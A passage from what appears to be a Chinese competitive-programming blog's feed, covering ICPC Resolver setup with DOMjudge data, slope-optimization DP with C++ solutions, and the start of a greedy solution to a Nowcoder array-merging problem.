class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;KMP 算法解决在文本串（text）快速找出单词（word）的所有出现位置。&lt;/p&gt;
&lt;p&gt;暴力匹配的时间复杂度为 $O(|T||W|)$，而 KMP 算法通过引入&lt;strong&gt;最长前后缀&lt;/strong&gt;，将检索的时间复杂度降至线性。&lt;/p&gt;
&lt;h2 id=&quot;最长前后缀
      
    
    </summary>
    
    
      <category term="KMP" scheme="http://mcginn7.github.io/tags/KMP/"/>
    
  </entry>
  
  <entry>
    <title>ICPC Resolver 踩坑</title>
    <link href="http://mcginn7.github.io/2019/05/12/ICPC-Resolver-%E8%B8%A9%E5%9D%91/"/>
    <id>http://mcginn7.github.io/2019/05/12/ICPC-Resolver-踩坑/</id>
    <published>2019-05-12T14:09:44.000Z</published>
    <updated>2019-05-22T05:41:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>从 DOMjudge 系统中导出数据，使用 ICPC Tools/Resolver 滚榜。</p><p>DOMjudge 版本：7.0.1。</p><p>Resolver 版本：2.0.1798。如果使用 DOMjudge 评测，建议使用 2.1 及以上版本。</p><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><ol><li><p>搜索 <a href="https://icpc.baylor.edu/icpctools/" target="_blank" rel="noopener">ICPC Tools</a>，下载 ICPC Resolver.rar。</p></li><li><p>运行 award.sh，通过 REST 导入 event feed（一场比赛的所有信息流）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: http://59.77.134.102/domjudge/api/contests/5</span><br><span class="line">USER: amdin</span><br><span class="line">Password: *******</span><br></pre></td></tr></table></figure><p>点击 <code>save</code> 保存为 “events.xml”。</p></li><li><p>目前版本（2.0.1798）的 Resolver 存在 bug，需要<strong>手动</strong>修订 events.xml 文件：</p><ol><li><p>第 1、2 行重复 <code>&lt;contest&gt;</code>，删除其中一行。</p></li><li><p><code>&lt;problem&gt;</code> 中的生成 <code>&lt;id&gt;</code> 从 0 开始，改成从 1 开始（否则导致部分提交不合法）。</p></li><li><p>删除信息不全的队伍，必要信息有：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">team</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>221801437<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Teamaaa<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">university</span>&gt;</span>福州大学<span class="tag">&lt;/<span class="name">university</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">university-short-name</span>&gt;</span>福州大学<span class="tag">&lt;/<span class="name">university-short-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">region</span>&gt;</span>Participants<span class="tag">&lt;/<span class="name">region</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">team</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>university-short-name</code> 为滚榜中显示的学校名称，故这里写学校全称。</p></li><li><p>末尾添加 <code>finalized</code> 信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">finalized</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">last-gold</span>&gt;</span>1<span class="tag">&lt;/<span class="name">last-gold</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">last-silver</span>&gt;</span>2<span class="tag">&lt;/<span class="name">last-silver</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">last-bronze</span>&gt;</span>3<span class="tag">&lt;/<span class="name">last-bronze</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">timestamp</span>&gt;</span>1557574214.130<span class="tag">&lt;/<span class="name">timestamp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">finalized</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">contest</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>timestamp</code> 可设置成任意值。</p></li></ol><p>可使用该代码 <a href="https://github.com/McGinn7/myscript/blob/master/icpc_resolver_revise_events_xml.py" target="_blank" rel="noopener"><strong>icpc_resolver_revise_events_xml</strong></a> 修订 events.xml。</p></li><li><p>使用 award.sh 打开<strong>处理后</strong>的 events.xml，设置金银铜奖人数，然后导出新的 xml 文件，并重新修订 events.xml 文件。</p><p>由于 award.sh 金银铜每组上限 10 个，共 30 个。不符合中国国情，故需要在 events.xml 中手动修改 <code>last-gold</code> 等字段。若 <code>last-gold=3, last-silver=10</code>，则表示设置金奖 3 个，银奖 7 个。</p><p>生成的 <code>&lt;award&gt;</code> 的 citation 可设置成 “金奖”、“银奖” 中文显示。</p></li><li><p>调用以下指令开始滚榜：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resolver.sh &lt;Path to CDP&gt;</span><br></pre></td></tr></table></figure></li><li><p>CDP（<a href="https://clics.ecs.baylor.edu/index.php?title=CDP" target="_blank" rel="noopener">Contest Data Package</a>）是提供榜单需要的数据目录，其中包括：</p><ol><li>config 目录，根据官方 wiki 设置即可，<strong>必要</strong>文件包括：<ol><li>contest.yaml：设置比赛标题、时长和封榜时间。</li><li>problemset.yaml：设置题目 id，题目名称。</li><li>groups.tsv, teams.tsv：从 DOMjudge 导出。</li><li><del>userdata.tsv</del>：官方 wiki 提示必须，实际上<strong>似乎可去除</strong>。</li></ol></li><li>events.xml：比赛信息；</li><li>images/logo/team_id.png：学校图标，每个学校的在 events.xml 的第一支队伍 id，id 不包含前导 0； </li><li>images/team/team_id.jpg：队伍照片，若出现 Out Of Memory 问题，则限制队伍照片的大小或者加大 resolver.sh 中 -Xmx 参数。</li></ol></li><li><p>榜单目前并不支持队伍、学校的中文显示，需要使用压缩工具（如 Bandizip）打开 “resolver/lib/presentContest.jar”，使用支持中文的字体替换 “font/HELV.PFB” 即可。 </p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;应用场景&quot;&gt;&lt;a href=&quot;#应用场景&quot; class=&quot;headerlink&quot; title=&quot;应用场景&quot;&gt;&lt;/a&gt;应用场景&lt;/h2&gt;&lt;p&gt;从 DOMjudge 系统中导出数据，使用 ICPC Tools/Resolver 滚榜。&lt;/p&gt;
&lt;p&gt;DOMjudge 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>斜率优化</title>
    <link href="http://mcginn7.github.io/2019/04/03/%E6%96%9C%E7%8E%87%E4%BC%98%E5%8C%96/"/>
    <id>http://mcginn7.github.io/2019/04/03/斜率优化/</id>
    <published>2019-04-03T13:11:53.000Z</published>
    <updated>2019-04-03T13:33:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="斜率优化"><a href="#斜率优化" class="headerlink" title="斜率优化"></a>斜率优化</h2><p>针对形如：</p><script type="math/tex; mode=display">dp(i)=\min _{j=1}^{i-1} (dp(j)+cost(i, j))</script><p>的动态规划转移方程，可通过’’斜率’’的<strong>单调性</strong>进行优化。</p><h2 id="题一、-HNOI2008-玩具装箱TOY"><a href="#题一、-HNOI2008-玩具装箱TOY" class="headerlink" title="题一、[HNOI2008]玩具装箱TOY"></a>题一、[HNOI2008]玩具装箱TOY</h2><h3 id="题意-题目链接"><a href="#题意-题目链接" class="headerlink" title="题意 题目链接"></a>题意 <a href="https://www.luogu.org/problemnew/show/P3195" target="_blank" rel="noopener">题目链接</a></h3><p>给定长为 $1\le N\le 50000$ 的序列 $1\le C_i\le 10^7$，将序列分成若干连续段，每段 $[i, j]$ 的花费为</p><script type="math/tex; mode=display">((j - i+\sum_{k=i}^jC_k)-L)^2</script><p>其中 $L$ 为常数，$1\le L \le 10^7$。要求计算总的最小花费代价。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>利用前缀和 $S_i​$，区间 $[i, j]​$ 序列和可表示成 $S_j - S_{i-1}​$。容易想到 dp 转移方程为：</p><script type="math/tex; mode=display">dp(j)=\min_{i=0}^{j-1}(dp(i)+cost(i, j)) \\cost(i, j) = ((j - (i + 1) + S_j - S_i) - L)^2</script><p>将变量整理归类，记 $a_j=j+S_j, b_i=i+S_i+L+1$，则 $cost(i, j)$ 转化成：</p><script type="math/tex; mode=display">cost(i, j) = (a_j-b_i)^2 = a_j^2+b_i^2-2a_jb_i</script><p>转移方程移项可得：</p><script type="math/tex; mode=display">2a_jb_i + dp(j)-a_j^2=dp(i)+b_i^2</script><p>因为 $a_j​$ 在 $j​$ 固定时可认为是个定值，故问题相当于最小化 $dp(j)-a_j^2​$，进而可以将问题看成是斜率为 $2a_j​$ 的直线，找出一点 $(b_i, dp(i)+b_i^2)​$ 使得直线在 $y​$ 轴的截距 $dp(j) - a_j^2​$ 最小。</p><img src="/2019/04/03/斜率优化/1554264317802.png" title="下凸壳"><center>图 1. 下凸壳。灰色点和黑色点分别表示非凸壳点和凸壳点。</center><p>显然，截距最小的关键点必然在<strong>下凸壳</strong>上，且下凸壳的每段斜率是<strong>单调递增</strong>的。</p><p>斜率为 $g$ 的直线截距最小所对应的最优点是，该点前一段斜率 $\lt g$，后一段斜率 $\gt g​$。</p><p>注意 $1\le C_i  \Rightarrow S_i \lt S_{i + 1} \Rightarrow a_i=i+S_i \lt a_{i + 1}=(i + 1) + S_{i + 1}$，斜率 $a_i$ 是单调递增的，则对应的最优点位置也是单调的，所以这种情况可通过<strong>双端队列</strong>将复杂度优化到 $O(n)​$。</p><h2 id="题二、小A与最大子段和"><a href="#题二、小A与最大子段和" class="headerlink" title="题二、小A与最大子段和"></a>题二、小A与最大子段和</h2><h3 id="题意-题目链接-1"><a href="#题意-题目链接-1" class="headerlink" title="题意 题目链接"></a>题意 <a href="https://ac.nowcoder.com/acm/contest/545/A" target="_blank" rel="noopener">题目链接</a></h3><p>给定长为 $1\le N \le 2\times 10^5​$ 的序列 $0 \le |A_i| \le 2000​$，找一个非空连续子段 $B​$，最大化：</p><script type="math/tex; mode=display">\sum_{i=1}^{|B|} i\times B_i</script><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>把问题进一步公式化：</p><script type="math/tex; mode=display">Ans = \max_{1\le i\le j\le N} \{\sum_{k=i}^j(k-i+1)\times A_k\} \tag 1</script><p>为了去除 $\sum$ ，引入前缀和 $S_i$ 和 $V_i=\sum_{p=1}^i p\times A_p​$，公式 (1) 转化成：</p><script type="math/tex; mode=display">Ans = \max_{0\le i\lt j\le N} \{(V_j-V_i)-i\times(S_j-S_i)\} \tag 2</script><p>根据变量下标整理归类：</p><script type="math/tex; mode=display">Ans = -S_j\times i+(i\times S_i-V_i) + V_j \\\Rightarrow S_j\times i+(Ans - V_j) = i\times S_i- V_i</script><p>同”玩具装箱TOY”，此时相当于令截距 $Ans - V_j$ <strong>最大</strong>，所以此时需要维护点集 $(i, iS_i-V_i)$ 的<strong>上凸壳</strong>。</p><p>因为 $A_i$ 存在负数，故斜率 $S_i$ 并不具有单调性，所以需要<strong>二分</strong>确定最优点的位置。 </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><p><a href="https://www.cnblogs.com/ka200812/archive/2012/08/03/2621345.html" target="_blank" rel="noopener">斜率优化DP</a></p></li><li><p><a href="https://blog.csdn.net/lxc779760807/article/details/51366552" target="_blank" rel="noopener">斜率优化dp小结</a></p></li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="HNOI2008-玩具装箱TOY"><a href="#HNOI2008-玩具装箱TOY" class="headerlink" title="[HNOI2008]玩具装箱TOY"></a>[HNOI2008]玩具装箱TOY</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">5e5</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> n, L, C[N];</span><br><span class="line">ll S[N], dp[N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">P</span> &#123;</span></span><br><span class="line">ll x, y;</span><br><span class="line">P() &#123;&#125;</span><br><span class="line">P(ll _x, ll _y) &#123;</span><br><span class="line">x = _x, y = _y;</span><br><span class="line">&#125;</span><br><span class="line">P <span class="keyword">operator</span>-(<span class="keyword">const</span> P &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> P(x - p.x, y - p.y);</span><br><span class="line">&#125;</span><br><span class="line">ll <span class="keyword">operator</span>^(<span class="keyword">const</span> P &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x * p.y - y * p.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X(i) (i + S[i] + L + 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Y(i) (dp[i] + X(i) * X(i))</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;L);</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, C + i);</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) S[i] = S[i - <span class="number">1</span>] + C[i];</span><br><span class="line"><span class="built_in">deque</span>&lt;P&gt; Q; Q.push_back(P(X(<span class="number">0</span>), Y(<span class="number">0</span>)));</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) &#123;</span><br><span class="line">ll g = <span class="number">2</span> * (i + S[i]);</span><br><span class="line"><span class="keyword">while</span> (sz(Q) &gt; <span class="number">1</span> &amp;&amp; (Q[<span class="number">1</span>].y - Q[<span class="number">0</span>].y) &lt; (Q[<span class="number">1</span>].x - Q[<span class="number">0</span>].x) * g) </span><br><span class="line">Q.pop_front();</span><br><span class="line">dp[i] = Q[<span class="number">0</span>].y - g * Q[<span class="number">0</span>].x + (i + S[i]) * (i + S[i]);</span><br><span class="line">P a(X(i), Y(i));</span><br><span class="line"><span class="keyword">while</span> (sz(Q) &gt; <span class="number">1</span> &amp;&amp; ((Q[sz(Q) - <span class="number">2</span>] - a) ^ (Q.back() - a)) &lt;= <span class="number">0</span>) </span><br><span class="line">Q.pop_back();</span><br><span class="line">Q.push_back(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>, dp[n]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小A与最大子段和"><a href="#小A与最大子段和" class="headerlink" title="小A与最大子段和"></a>小A与最大子段和</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) ((int)(x).size())</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) begin(x),end(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,l,r) for(int i=(l);i&lt;(r);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,l,r) for(int i=(r)-1;i&gt;=(l);--i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; <span class="meta-string">", "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="comment">//-------</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> n, a[N];</span><br><span class="line">ll S[N], V[N];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X(i) (i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Y(i) (i * S[i] - V[i])</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">P</span> &#123;</span></span><br><span class="line">ll x, y;</span><br><span class="line">P() &#123;&#125; P(ll _x, ll _y) &#123; x = _x, y = _y; &#125; </span><br><span class="line">P <span class="keyword">operator</span>-(<span class="keyword">const</span> P &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> P(x - p.x, y - p.y);</span><br><span class="line">&#125;</span><br><span class="line">ll <span class="keyword">operator</span>^(<span class="keyword">const</span> P &amp;p) <span class="keyword">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x * p.y - y * p.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">chk</span><span class="params">(<span class="built_in">deque</span>&lt;P&gt; &amp;Q, <span class="keyword">int</span> i, ll G)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (Q[i + <span class="number">1</span>].y - Q[i].y) &gt;= (Q[i + <span class="number">1</span>].x - Q[i].x) * G;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, a + i);</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) S[i] = S[i - <span class="number">1</span>] + a[i];</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) V[i] = V[i - <span class="number">1</span>] + i * a[i];</span><br><span class="line"></span><br><span class="line"><span class="built_in">deque</span>&lt;P&gt; Q; Q.push_back(P(X(<span class="number">0</span>), Y(<span class="number">0</span>)));</span><br><span class="line">ll ans = LLONG_MIN;</span><br><span class="line">rep(i, <span class="number">1</span>, n + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// answer</span></span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>, r = max(<span class="number">0</span>, sz(Q) - <span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span> (l + <span class="number">1</span> &lt; r) &#123;</span><br><span class="line"><span class="keyword">int</span> z = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">chk(Q, z, S[i]) ? l = z : r = z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> j = l;</span><br><span class="line"><span class="keyword">if</span> (chk(Q, r, S[i])) j = r + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (chk(Q, l, S[i])) j = l + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> j = l;</span><br><span class="line">ll f = Q[j].y - S[i] * Q[j].x + V[i];</span><br><span class="line">ans = max(ans, f);</span><br><span class="line"><span class="comment">// maintain</span></span><br><span class="line">P a(X(i), Y(i));</span><br><span class="line"><span class="keyword">while</span> (sz(Q) &gt; <span class="number">1</span> &amp;&amp; ((Q[sz(Q) - <span class="number">2</span>] - a) ^ (Q.back() - a)) &gt;= <span class="number">0</span>)</span><br><span class="line">Q.pop_back();</span><br><span class="line">Q.push_back(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>, ans);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;斜率优化&quot;&gt;&lt;a href=&quot;#斜率优化&quot; class=&quot;headerlink&quot; title=&quot;斜率优化&quot;&gt;&lt;/a&gt;斜率优化&lt;/h2&gt;&lt;p&gt;针对形如：&lt;/p&gt;
&lt;script type=&quot;math/tex; mode=display&quot;&gt;
dp(i)=\min _{
      
    
    </summary>
    
    
      <category term="ICPC" scheme="http://mcginn7.github.io/tags/ICPC/"/>
    
      <category term="斜率优化" scheme="http://mcginn7.github.io/tags/%E6%96%9C%E7%8E%87%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Nowcoder-出题人的数组</title>
    <link href="http://mcginn7.github.io/2019/03/31/Nowcoder-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E6%95%B0%E7%BB%84/"/>
    <id>http://mcginn7.github.io/2019/03/31/Nowcoder-出题人的数组/</id>
    <published>2019-03-31T12:11:49.000Z</published>
    <updated>2019-04-03T14:01:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>链接：<a href="https://ac.nowcoder.com/acm/contest/545/C" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/contest/545/C</a><br>来源：牛客网</p><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>出题人有两个数组 $A, B$，请你把两个数组归并起来使得 $Cost=∑i∗C_i$ 最小，要求两个原数组的顺序在新数组中保持不变。 </p><h4 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述"></a>输入描述</h4><p>第一行输入两个正整数 $n,m$，分别表示数组 $A, B$ 的长度。<br>第二行输入 $n$ 个正整数，表示数组 $A$。<br>第二行输入 $m$ 个正整数，表示数组 $B$ 。</p><h4 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述"></a>输出描述</h4><p>一个正整数，表示最小代价 $Cost$。</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h4><table style="border-collapse:collapse;border-spacing:0;border-color:#999" class="tg"><tr><th style="font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 10px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#fd6864;color:#fff;background-color:#fd6864;text-align:left">输入</th><th style="font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 10px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#fd6864;color:#fff;background-color:#fd6864;text-align:left">输出</th></tr><tr><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 10px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#fd6864;color:#444;background-color:#F7FDFA;text-align:left">3 3<br>1 3 5<br>2 6 4</td><td style="font-family:Arial, sans-serif;font-size:14px;padding:10px 10px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#fd6864;color:#444;background-color:#F7FDFA;text-align:left">75</td></tr></table><h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><p>$n, m \le 100000$</p><p>$A_i, B_i \le 100000$</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>$O(nm)$ 动态规划很容易想到，但是复杂度太高且没有方法优化，那么就考虑贪心解法。</p><p>显然，合并后的数组 $C$ 格式为 $\dots ABABA\dots$，即一段 $A$ 接一段 $B$ 。</p><p>常见的贪心策略为，考虑相邻元素的交换是否会导致更优的结果。由于不能打乱原先的顺序，故总是后段的前缀替换前段的后缀，不失一般性，我们可以假设前段为 $A$，后段为 $B$。</p><p>记 $Cost(A) = \sum_{i = 1} ^ {|A|}i\times A_i$，则原先的贡献值为 $Cost(A)+Cost(B)+|A|\times Sum(B)$，交换后的贡献值为 $Cost(A)+Cost(B)+|B|\times Sum(A)$，则当 $|B|\times Sum(A) \lt |A|\times Sum(B)$，即</p><script type="math/tex; mode=display">\frac{Sum(A)}{|A|} \lt \frac{Sum(B)}{|B|}</script><p>也就是说，<strong>均值越大的段需要优先选择</strong>。</p><p>剩下的就是如何构造这些段，我们假设串 $A=A_1A_2$，当 $Average(A_1)\lt Average(A_2)$ 时，在数组 $C$ 